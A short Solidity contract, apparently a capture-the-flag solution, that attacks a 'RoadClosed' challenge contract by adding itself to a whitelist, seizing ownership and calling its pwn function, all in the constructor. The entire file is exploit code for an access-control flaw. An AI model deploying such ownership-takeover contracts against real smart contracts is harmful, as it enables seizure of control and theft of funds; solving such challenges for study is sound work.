pragma solidity 0.8.17;

import "./RoadClosed.sol";

contract RoadAttack {
    RoadClosed public roadClosed;
    address immutable owner;

    constructor(address _roadClosed) {
        roadClosed = RoadClosed(_roadClosed);
        owner = msg.sender;
        roadClosed.addToWhitelist(address(this));
        roadClosed.changeOwner(address(this));
        roadClosed.pwn(address(this));
    }
}
